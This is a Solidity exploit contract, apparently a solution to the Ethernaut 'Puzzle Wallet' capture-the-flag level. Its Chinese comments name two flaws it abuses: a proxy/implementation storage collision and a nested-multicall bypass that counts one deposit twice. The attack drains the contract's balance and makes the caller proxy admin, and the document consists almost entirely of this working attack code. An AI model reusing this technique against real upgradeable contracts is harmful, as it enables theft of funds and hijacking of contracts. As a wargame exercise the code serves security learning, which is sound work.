// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "hardhat/console.sol";

interface ILevel{
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function multicall(bytes[] memory data)  external payable;
    function deposit() external payable;
}

contract PuzzleProxyRun{
  
    function run(address _runAddress) external payable {
      ILevel level = ILevel(_runAddress);
      //proxy和impl的storage位置冲突了，设置pendingAdmin对应的是impl的owner
      level.proposeNewAdmin(address(this));
      level.addToWhitelist(address(this));    
      bytes memory depositData = abi.encodeWithSelector(
                                      bytes4(keccak256("deposit()")));
      bytes memory executeData = abi.encodeWithSelector(
                                      bytes4(keccak256("execute(address,uint256,bytes)")),
                                      address(this),
                                      0.002 ether,
                                      new bytes(0));                                    
      bytes [] memory mutilecallBytes = new bytes[](3); 
      mutilecallBytes[0]=getMuticallData(depositData);
      mutilecallBytes[1]=getMuticallData(depositData);
      mutilecallBytes[2]=getMuticallData(executeData);
      
      //multicall逻辑漏洞，只验证了同个列表不能有多个deposit，没验证不能multicall，这样可以把deposit放在multicall里
      level.multicall{value:0.001 ether}(mutilecallBytes);
      //proxy和impl的storage位置冲突了，设置maxBalance对应的是proxy的admin
      level.setMaxBalance(uint160(msg.sender));
    }

    function getMuticallData(bytes memory data) private pure returns (bytes memory){
      bytes [] memory mutilecallBytes = new bytes[](1); 
      mutilecallBytes[0]=data;
      bytes memory mutilecallData = abi.encodeWithSelector(
                                      bytes4(keccak256("multicall(bytes[])")),
                                      mutilecallBytes);
      return mutilecallData;
    }

    receive() external payable {
    }

    fallback() external payable {
    } 

}